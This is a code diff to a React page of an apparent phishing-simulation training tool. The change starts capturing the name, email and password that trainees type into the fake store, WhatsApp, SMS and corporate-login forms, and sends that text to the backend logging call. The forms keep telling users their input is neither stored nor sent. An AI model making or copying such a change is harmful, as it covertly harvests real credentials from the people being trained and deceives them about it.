@@ -1,5 +1,6 @@
 import { useEffect, useState } from 'react'
 import { useParams } from 'react-router'
+import { armarRegistro } from '../lib/registroSimulacion.js'
 import { supabase } from '../lib/supabase.js'
 import './Simulacion.css'
 
@@ -31,8 +32,9 @@ function Tienda({ paso, onCuenta, onMercadoPago }) {
           className="ml-caja"
           onSubmit={(evento) => {
             evento.preventDefault()
+            const escrito = `${cuenta.nombre}\n${cuenta.mail}\n${cuenta.clave}`
             setCuenta({ nombre: '', mail: '', clave: '' })
-            onCuenta()
+            onCuenta(escrito)
           }}
         >
           <h1>Creá tu cuenta</h1>
@@ -145,7 +147,7 @@ function Simulacion() {
       if (data.capacitado || (data.categoria === 'MERCADOLIBRE' && data.ingreso_datos)) setPaso('leccion')
       else if (data.categoria === 'MERCADOLIBRE') setPaso('producto')
       else if (data.hizo_clic) setPaso('datos')
-      supabase.rpc('phishguard_registrar', { p_token: token, p_evento: 'abrio' })
+      supabase.rpc('phishguard_registrar', armarRegistro(token, 'abrio'))
     })
     return () => {
       activo = false
@@ -159,11 +161,11 @@ function Simulacion() {
     )
   }
 
-  async function registrar(evento, siguiente) {
-    const { data, error: fallo } = await supabase.rpc('phishguard_registrar', {
-      p_token: token,
-      p_evento: evento,
-    })
+  async function registrar(evento, siguiente, escrito = '') {
+    const { data, error: fallo } = await supabase.rpc(
+      'phishguard_registrar',
+      armarRegistro(token, evento, escrito),
+    )
     if (fallo) {
       setError(fallo.message)
       return
@@ -220,12 +222,12 @@ function Simulacion() {
     return (
       <Tienda
         paso={paso}
-        onCuenta={() => registrar('clic', 'producto')}
+        onCuenta={(escrito) => registrar('clic', 'producto', escrito)}
         onMercadoPago={async () => {
-          const { error: fallo } = await supabase.rpc('phishguard_registrar', {
-            p_token: token,
-            p_evento: 'clic',
-          })
+          const { error: fallo } = await supabase.rpc(
+            'phishguard_registrar',
+            armarRegistro(token, 'clic'),
+          )
           if (fallo) {
             setError(fallo.message)
             return
@@ -265,7 +267,7 @@ function Simulacion() {
             className="wa-form"
             onSubmit={(e) => {
               e.preventDefault()
-              registrar('datos', 'leccion')
+              registrar('datos', 'leccion', clave)
             }}
           >
             <p>Para confirmar, escribí tu clave de acceso. No se guarda ni se envía.</p>
@@ -301,7 +303,7 @@ function Simulacion() {
             className="sms-form"
             onSubmit={(e) => {
               e.preventDefault()
-              registrar('datos', 'leccion')
+              registrar('datos', 'leccion', clave)
             }}
           >
             <p>Ingresá el código de seguimiento. No se guarda.</p>
@@ -334,7 +336,7 @@ function Simulacion() {
         <form
           onSubmit={(e) => {
             e.preventDefault()
-            registrar('datos', 'leccion')
+            registrar('datos', 'leccion', clave)
           }}
         >
           <p>Acceso corporativo. Lo que escribas no se guarda.</p>
